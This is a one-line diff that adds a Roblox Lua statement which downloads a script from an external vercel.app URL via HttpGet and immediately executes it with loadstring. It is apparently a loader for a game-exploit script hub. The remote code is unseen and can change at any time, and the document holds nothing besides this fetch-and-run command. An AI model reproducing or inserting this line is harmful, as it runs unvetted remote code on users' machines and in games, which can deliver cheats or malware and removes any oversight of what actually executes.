@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://yanzhub.vercel.app/script.txt"))()
